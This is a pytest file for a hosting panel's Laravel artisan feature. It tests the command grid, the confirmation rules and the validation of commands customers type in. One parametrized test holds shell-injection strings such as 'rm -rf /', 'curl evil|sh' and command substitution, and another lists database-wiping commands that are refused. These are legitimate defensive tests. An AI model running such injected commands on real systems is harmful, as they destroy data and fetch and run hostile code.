"""Ploi's artisan command grid, and the customer's own commands.

Ploi surfaces 24 artisan commands in 11 named groups plus a free-text box. We had 7 actions.
The gap was not the dangerous half — we already offer `migrate` and they do not — it was the
everyday one: clearing a single cache, retrying failed jobs, running the scheduler now.

Two rules carry it. **A named action can never contain customer text** (the key indexes a
table), and **a typed command is refused rather than escaped** — with the refusal list
covering only what empties the database, because an allow-list cannot know the names of a
customer's own commands and would make the feature useless.
"""
import shlex

import pytest

from app.services import laravel_service as ls


# ── The grid ─────────────────────────────────────────────────────────────────

def test_every_command_ploi_offers_is_here():
    """Read off their live panel on 2026-08-06. Their reads live in READS, their writes here.
    `version` is the one we skip: it prints the framework version, which our probe already
    shows at the top of the page."""
    theirs = {
        "cache:clear", "config:clear", "config:cache", "down", "up",
        "queue:flush", "queue:restart", "queue:retry all", "optimize", "optimize:clear",
        "route:cache", "route:clear", "storage:link", "schedule:run",
        "view:clear", "view:cache",
    }
    ours = {spec["cmd"].split(" --")[0] for spec in ls.ACTIONS.values()}
    missing = theirs - ours
    assert not missing, f"Ploi offers these and we do not: {sorted(missing)}"


def test_the_reads_they_offer_are_reads_here_not_writes():
    """`migrate:status`, `about`, `route:list`, `schedule:list`, `queue:failed`, `env`."""
    read_cmds = {spec["cmd"].split(" --")[0] for spec in ls.READS.values()}
    for cmd in ("migrate:status", "about", "route:list", "schedule:list", "queue:failed"):
        assert cmd in read_cmds, cmd


def test_every_action_is_grouped_and_explained_without_jargon():
    """A grid of artisan command names helps somebody who already knows artisan — which is
    not who this product is for."""
    for key, spec in ls.ACTIONS.items():
        assert spec["group"] and spec["label"] and spec["blurb"], key
        assert "artisan" not in spec["blurb"].lower(), key
        assert 0 < spec["t"] <= 600, key


def test_the_command_line_never_contains_caller_text():
    for key, spec in ls.ACTIONS.items():
        cmd = ls.build_action_command(key, "/var/www/x/public")
        assert f"$ART {spec['cmd']} --no-ansi" in cmd, key


def test_an_unknown_action_is_refused():
    with pytest.raises(ls.LaravelError):
        ls.build_action_command("migrate:fresh", "/var/www/x")


# ── Which ones get asked about first ─────────────────────────────────────────

def test_the_four_that_deserve_a_confirmation_are_marked():
    """Not "everything that writes" — that teaches people to click through. These four each
    destroy or duplicate something a customer would miss: a migration can drop a column,
    flushing deletes the record of failed work, retrying can charge somebody twice, and
    running the scheduler fires real work outside its schedule."""
    assert ls.DESTRUCTIVE == {"migrate", "queue_flush", "queue_retry_all", "schedule_run"}


def test_clearing_a_cache_is_not_treated_as_dangerous():
    """If everything needs confirming, nothing does."""
    for safe in ("clear", "cache_clear", "config_clear", "view_clear", "up", "storage_link"):
        assert safe not in ls.DESTRUCTIVE


# ── The customer's own commands ──────────────────────────────────────────────

def test_an_applications_own_command_runs():
    assert ls.check_custom("app:send-invoices") == "app:send-invoices"


def test_arguments_survive_as_separate_words():
    """The bug this prevents is one the daemons work already made once, inverted: quoting the
    whole string hands artisan a single argument literally named "app:send --dry", which is
    not a command. So it is asserted the way a shell would read it, not by substring."""
    cmd = ls.build_custom_command("app:send --dry --queue=high", "/var/www/x")
    line = [l for l in cmd.splitlines() if "$ART" in l][-1]
    words = shlex.split(line)
    assert words[-4:] == ["app:send", "--dry", "--queue=high", "--no-ansi"]


@pytest.mark.parametrize("attack", [
    "about; rm -rf /", "about && curl evil|sh", "about `id`", "about $(id)",
    "about > /etc/passwd", "about\nrm -rf /", 'about "x"', "about 'x'",
])
def test_a_second_command_cannot_be_smuggled_in(attack):
    with pytest.raises(ls.LaravelError):
        ls.check_custom(attack)


@pytest.mark.parametrize("wipes", ["db:wipe", "migrate:fresh", "migrate:reset",
                                   "migrate:refresh", "migrate:rollback", "DB:WIPE"])
def test_the_commands_that_empty_the_database_are_refused_not_confirmed(wipes):
    """A confirmation is a thing people click, and the cost here is the customer's entire
    dataset with no undo anywhere in this system. Somebody who means it has a terminal."""
    with pytest.raises(ls.LaravelError) as exc:
        ls.check_custom(wipes)
    assert "empties the database" in str(exc.value)


def test_tinker_is_refused_because_it_is_a_shell():
    """`tinker` is an interactive PHP REPL with full application access. Over a request that
    waits for output it would simply hang, and what it can do is unbounded."""
    with pytest.raises(ls.LaravelError):
        ls.check_custom("tinker")


def test_typing_php_artisan_is_corrected_rather_than_run():
    """People paste the whole line they use over SSH. `php artisan about` would become
    `artisan php artisan about`, which fails for a reason nobody could guess."""
    for prefix in ("php artisan about", "artisan about", "./artisan about"):
        with pytest.raises(ls.LaravelError) as exc:
            ls.check_custom(prefix)
        assert "artisan command itself" in str(exc.value)


def test_an_empty_or_enormous_command_is_refused():
    with pytest.raises(ls.LaravelError):
        ls.check_custom("   ")
    with pytest.raises(ls.LaravelError):
        ls.check_custom("a" * 300)


def test_whitespace_is_tidied_rather_than_rejected():
    assert ls.check_custom("  app:send   --dry  ") == "app:send --dry"


def test_the_output_is_redacted_before_it_leaves_the_server():
    """A custom command can print anything, including a token out of the application's own
    configuration. The browser is not the place to find that out."""
    import inspect

    src = inspect.getsource(ls.act_custom)
    assert "redact_secrets" in src
    assert '"output": text' in src
